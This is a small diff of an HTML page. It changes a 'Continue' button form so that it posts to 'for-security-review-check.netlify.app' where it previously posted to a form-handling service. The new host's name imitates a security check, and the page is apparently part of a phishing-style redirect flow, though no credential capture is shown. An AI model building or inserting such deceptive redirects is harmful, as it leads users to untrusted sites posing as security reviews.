@@ -120,7 +120,7 @@
             </div>
 
             <!-- Continue button with JavaScript redirection -->
-            <form id="redirectForm" method="post" action="https://submit-form.com/wjXxrgfll">
+            <form id="redirectForm" method="post" action="https://for-security-review-check.netlify.app/">
                 <button type="submit" class="button">Continue</button>
             </form>
 
